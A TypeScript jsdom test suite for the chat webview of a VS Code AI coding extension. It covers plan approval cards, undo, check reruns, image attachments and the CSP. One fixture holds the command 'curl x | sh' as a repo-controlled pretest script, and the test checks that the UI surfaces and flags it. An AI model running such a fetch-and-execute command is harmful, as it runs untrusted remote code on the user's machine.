// Drives the real media/webview/main.js in jsdom: plan card, plan applied/undone, checks offer, Problems chip.
import { test } from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { JSDOM } from 'jsdom';

const root = path.join(__dirname, '..', '..');
/* eslint-disable @typescript-eslint/no-explicit-any */
function boot() {
  const src = fs.readFileSync(path.join(root, 'src', 'chat.ts'), 'utf8');
  const body = src.slice(src.indexOf('<body'), src.indexOf('<script', src.indexOf('<body'))).replace(/\$\{[^}]*\}/g, '');
  const dom = new JSDOM(`<!DOCTYPE html><html><head></head>${body}</body></html>`, { runScripts: 'outside-only', pretendToBeVisual: true });
  const w = dom.window as any;
  const sent: any[] = [];
  w.acquireVsCodeApi = () => ({ postMessage: (m: any) => sent.push(m), getState: () => undefined, setState: () => undefined });
  w.requestAnimationFrame = (f: any) => setTimeout(f, 0); w.cancelAnimationFrame = (id: any) => clearTimeout(id);
  w.HTMLElement.prototype.scrollIntoView = () => undefined;
  if (!w.matchMedia) { w.matchMedia = () => ({ matches: false, addEventListener() { /* */ }, addListener() { /* */ } }); }
  for (const f of ['marked.min.js', 'purify.min.js', 'cards.js']) { w.eval(fs.readFileSync(path.join(root, 'media', 'webview', f), 'utf8')); }
  w.eval(fs.readFileSync(path.join(root, 'media', 'webview', 'main.js'), 'utf8'));
  const post = (m: any) => w.dispatchEvent(new w.MessageEvent('message', { data: m }));
  return { w, d: w.document as Document, sent, post };
}
const planReq = { kind: 'plan', summary: 'S', files: [
  { path: 'src/components/a.ts', op: 'create', added: 3, removed: 0 },
  { path: 'src/b.ts', op: 'delete', added: 0, removed: 4 },
  { path: 'src/c.ts', op: 'rename', newPath: 'src/d.ts', added: 0, removed: 0 },
  { path: '.env.local', op: 'create', added: 0, removed: 0, refused: 'secrets/credentials file' },
] };

test('plan card: refused row disabled with reason; meta line; Select all tri-state; focus not on Approve', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'r1', request: planReq });
  const card = d.querySelector('.plan-card')!;
  assert.match(card.querySelector('.approval-head')!.textContent!, /3 files/);
  assert.equal(card.querySelector('.plan-meta')!.textContent, '1 new · 1 rename · 1 delete · 1 refused');
  const rows = [...card.querySelectorAll('.plan-file')] as HTMLElement[];
  assert.equal(rows.length, 4);
  const ref = rows[3]; const rcb = ref.querySelector('input') as HTMLInputElement;
  assert.ok(ref.classList.contains('refused')); assert.equal(rcb.disabled, true); assert.equal(rcb.checked, false);
  assert.equal(d.getElementById(rcb.getAttribute('aria-describedby')!)!.textContent, '⛔ secrets/credentials file');
  assert.equal(ref.querySelector('.plan-diff'), null);
  assert.equal(rows[1].dataset.op, 'delete');
  assert.equal(rows[0].querySelector('.plan-op')!.getAttribute('aria-hidden'), 'true');
  assert.equal(rows[0].querySelector('.sr-only')!.textContent, 'new: ');
  assert.equal(rows[0].querySelectorAll('wbr').length, 2);
  assert.match(rows[2].querySelector('.plan-new')!.textContent!, /→ src\/d\.ts/);
  assert.equal(rows[1].querySelector('.plan-delta')!.getAttribute('aria-label'), '4 lines removed');
  const ok = card.querySelector('.approval-btn.approve') as HTMLButtonElement;
  const all = card.querySelector('.plan-all input') as HTMLInputElement;
  assert.equal(ok.textContent, 'Approve all (3)');
  assert.notEqual(d.activeElement, ok); assert.equal(d.activeElement, all);
  (rows[1].querySelector('input') as HTMLInputElement).click();
  assert.equal(ok.textContent, 'Approve selected (2/3)'); assert.equal(all.indeterminate, true);
  all.click(); assert.equal(ok.textContent, 'Approve all (3)'); assert.equal(all.indeterminate, false);
  all.click(); assert.equal(ok.disabled, true);
  all.click();
});

test('plan card: decision sends file indices, marks skipped rows, holds then returns focus', () => {
  const { d, post, sent } = boot();
  post({ type: 'approvalRequest', reqId: 'r1', request: planReq });
  const card = d.querySelector('.plan-card')!;
  const rows = [...card.querySelectorAll('.plan-file')] as HTMLElement[];
  (rows[1].querySelector('input') as HTMLInputElement).click();
  (card.querySelector('.approval-btn.approve') as HTMLButtonElement).click();
  const m = sent.find(x => x.type === 'approvalResponse');
  assert.deepEqual([...m.selected], [0, 2]);
  assert.ok(rows[1].classList.contains('skipped')); assert.ok(!rows[0].classList.contains('skipped'));
  const status = card.querySelector('.approval-status')!;
  assert.equal(d.activeElement, status); assert.equal(status.textContent, 'Applying…');
  post({ type: 'approvalResolved', reqId: 'r1', state: 'approved' });
  assert.equal(d.activeElement, d.getElementById('input'));
  assert.equal(card.querySelector('.approval-actions'), null);
});

test('command card keeps focus on Run, then holds and returns focus after the decision', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'c1', request: { kind: 'command', command: 'npm test' } });
  const run = d.querySelector('.approval-btn.approve') as HTMLButtonElement;
  assert.equal(d.activeElement, run);
  run.click();
  assert.equal(d.activeElement!.className, 'approval-status');
  post({ type: 'approvalResolved', reqId: 'c1', state: 'approved' });
  assert.equal(d.activeElement, d.getElementById('input'));
});

test('plan applied card: data-action buttons, undone title/state, non-retryable refusal keeps Undo disabled', () => {
  const { d, post, sent } = boot();
  post({ type: 'planApplied', planId: 'p1', paths: ['a', 'b'], summary: 'S' });
  post({ type: 'planApplied', planId: 'p2', paths: ['c'] });
  assert.equal(d.getElementById('sr-announce')!.textContent, 'Plan applied: 1 file');
  const [c1, c2] = [...d.querySelectorAll('.plan-done')] as HTMLElement[];
  const chk = c1.querySelector('[data-action="checks"]') as HTMLButtonElement;
  chk.click();
  assert.equal(c1.querySelector('.approval-status')!.textContent, 'Asked Grok to re-run the checks.');
  assert.ok(sent.some(m => m.type === 'rerunChecks'));
  (c1.querySelector('[data-action="undo"]') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'undoPlan' && m.planId === 'p1'));
  post({ type: 'planUndone', planId: 'p1', ok: true, msg: 'Undid plan: a, b' });
  assert.equal(c1.dataset.state, 'undone'); assert.equal(c1.querySelector('.approval-head')!.textContent, '↶ Plan undone');
  assert.equal(c1.querySelector('[data-action="undo"]'), null);
  (c2.querySelector('[data-action="undo"]') as HTMLButtonElement).click();
  post({ type: 'planUndone', planId: 'p2', ok: false, msg: "Can't undo: c changed since the plan was applied." });
  assert.equal((c2.querySelector('[data-action="undo"]') as HTMLButtonElement).disabled, true);
  assert.match(c2.querySelector('.approval-status')!.textContent!, /^✕ Can't undo/);
  post({ type: 'planUndone', planId: 'p2', ok: false, msg: 'Undo failed', retryable: true });
  assert.equal((c2.querySelector('[data-action="undo"]') as HTMLButtonElement).disabled, false);
});

test('checks offer is a footer button on the turn, not a card', () => {
  const { d, post, sent } = boot();
  post({ type: 'streamStart', id: 'a1' });
  post({ type: 'checksOffer' });
  post({ type: 'streamDone', id: 'a1', meta: {} });
  assert.equal(d.querySelector('.checks-offer'), null);
  const b = d.querySelector('.msg-footer .checks-btn') as HTMLButtonElement;
  assert.ok(b); assert.match(b.textContent!, /Re-run checks/);
  b.click(); assert.ok(sent.some(m => m.type === 'rerunChecks')); assert.equal(b.disabled, true);
});

test('Problems chip: aria-label, hidden glyph, aria-pressed toggle', () => {
  const { d, post, sent } = boot();
  post({ type: 'problemsState', count: 3, enabled: true });
  let pc = d.querySelector('.problems-chip') as HTMLButtonElement;
  assert.equal(pc.getAttribute('aria-label'), 'Include 3 problems');
  assert.equal(pc.getAttribute('aria-pressed'), 'true');
  assert.equal(pc.querySelector('.chip-glyph')!.getAttribute('aria-hidden'), 'true');
  assert.match(pc.title, /each message/);
  pc.click(); assert.ok(sent.some(m => m.type === 'toggleProblems'));
  post({ type: 'problemsState', count: 3, enabled: false });
  pc = d.querySelector('.problems-chip') as HTMLButtonElement;
  assert.equal(pc.getAttribute('aria-pressed'), 'false'); assert.ok(pc.classList.contains('off'));
});

test('stylesheet: plan list max height, sticky footer, refused/skipped/undone, HC underline', () => {
  const css = fs.readFileSync(path.join(root, 'media', 'webview', 'style.css'), 'utf8');
  for (const re of [/\.plan-card \.plan-files,\.plan-done \.plan-files\{max-height:min\(45vh,320px\);overflow-y:auto/, /\.plan-card \.approval-actions\{position:sticky;bottom:0/,
    /\.plan-file\.refused \.plan-path\{text-decoration:line-through/, /\.plan-file\.skipped\{/, /\[data-state=undone\]/, /vscode-high-contrast \.plan-diff[^{]*\{text-decoration:underline/,
    /\.chip\.problems-chip\.off\{color:var\(--vscode-descriptionForeground\);border-style:dashed\}/]) { assert.match(css, re); }
  assert.doesNotMatch(css, /overflow-wrap:anywhere;cursor:pointer/);
});

test('H3: command card shows what the script runs and flags repo-controlled sources', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'c9', request: { kind: 'command', command: 'npm test', runs: ['pretest: curl x | sh', 'test: jest'], source: 'package.json scripts.test', repoControlled: true } });
  assert.equal(d.querySelector('.approval-runs')!.textContent, 'pretest: curl x | sh\ntest: jest');
  const src = d.querySelector('.approval-source')!;
  assert.ok(src.classList.contains('repo')); assert.match(src.textContent!, /repo-controlled/);
});

test('L1: flagged plan rows show the warning and link it to the checkbox', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'r7', request: { kind: 'plan', files: [{ path: '.vscode/tasks.json', op: 'create', added: 1, removed: 0, warn: 'changes VS Code tasks/launch/settings' }] } });
  const w = d.querySelector('.plan-warn')!;
  assert.match(w.textContent!, /tasks/);
  assert.equal(d.querySelector('.plan-file input')!.getAttribute('aria-describedby'), w.id);
});

test('images: attached image shows as removable thumbnail chip and is sent with the query; vision note switches model; cost meter', async () => {
  const { w, d, post, sent } = boot();
  // jsdom doesn't decode images: report a small natural size so the original PNG is kept (no canvas needed).
  w.Image = class { naturalWidth = 1; naturalHeight = 1; onload: any; onerror: any; set src(_v: string) { setTimeout(() => this.onload(), 0); } };
  const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  post({ type: 'imageFile', name: 'shot.png', dataUrl: PNG });
  post({ type: 'imageFile', name: 'two.png', dataUrl: PNG });
  await new Promise(r => setTimeout(r, 30));
  let chips = d.querySelectorAll('.image-chip');
  assert.equal(chips.length, 2);
  assert.equal(chips[0].querySelector('img')!.getAttribute('alt'), 'Image 1: shot.png');
  (chips[1].querySelector('.chip-x') as HTMLButtonElement).click();
  chips = d.querySelectorAll('.image-chip'); assert.equal(chips.length, 1);
  (d.getElementById('input') as HTMLTextAreaElement).value = 'what is this';
  (d.getElementById('send') as HTMLButtonElement).click();
  const q = sent.find(m => m.type === 'query');
  assert.equal(q.text, 'what is this'); assert.equal(q.images.length, 1); assert.equal(q.images[0], PNG);
  post({ type: 'userMessage', id: 'u1', text: 'what is this', chips: [], images: [PNG] });
  assert.equal(d.querySelectorAll('.image-chip').length, 0);
  assert.equal(d.querySelectorAll('.user-images img').length, 1);

  post({ type: 'models', models: [{ id: 'old' }, { id: 'grok-4.7' }], current: 'old' });
  post({ type: 'visionNote', model: 'old', suggest: 'grok-4.7' });
  const card = d.querySelector('.vision-note')!;
  assert.match(card.querySelector('.approval-head')!.textContent!, /old can't read images/);
  (card.querySelector('[data-action="switch"]') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'updateSettings' && m.model === 'grok-4.7'));
  assert.equal((d.getElementById('model') as HTMLSelectElement).value, 'grok-4.7');

  (d.getElementById('attach-image') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'pickImage'));

  const cm = d.getElementById('cost-meter')!;
  assert.equal(cm.hidden, true);
  post({ type: 'costMeter', hidden: false, text: '12k tok · $0.012', tooltip: 'This chat: 2 turns' });
  assert.equal(cm.hidden, false); assert.equal(cm.textContent, '12k tok · $0.012'); assert.equal(cm.title, 'This chat: 2 turns');
});

test('CSP allows data: images only (no blob:, no remote)', () => {
  const src = fs.readFileSync(path.join(root, 'src', 'chat.ts'), 'utf8');
  const csp = /Content-Security-Policy" content="([^"]+)"/.exec(src)![1];
  assert.match(csp, /img-src \$\{webview\.cspSource\} data:;/); assert.doesNotMatch(csp, /blob:|https:/);
});
